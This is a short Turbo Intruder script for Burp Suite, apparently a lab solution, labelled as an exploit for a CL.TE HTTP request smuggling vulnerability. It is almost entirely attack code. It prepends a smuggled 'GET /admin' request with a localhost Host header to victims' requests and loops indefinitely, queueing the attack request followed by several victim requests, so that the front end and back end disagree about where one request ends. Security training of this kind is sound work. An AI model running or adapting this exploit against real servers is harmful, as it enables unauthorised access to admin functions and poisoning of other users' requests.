# Xploit script to be run in Burp Intruder for the Content Length Transfer Encoding vulnerability
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )
    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET /admin HTTP/1.1
    Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x='''

    # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise
    if '\r' not in prefix:
        prefix = prefix.replace('\n', '\r\n')

    # The request engine will auto-fix the content-length for us
    attack = target.req + prefix
    victim = target.req

    while True:

        engine.queue(attack)
        for i in range(4):
            engine.queue(victim)
            time.sleep(0.05)
        time.sleep(1)


def handleResponse(req, interesting):
    table.add(req)
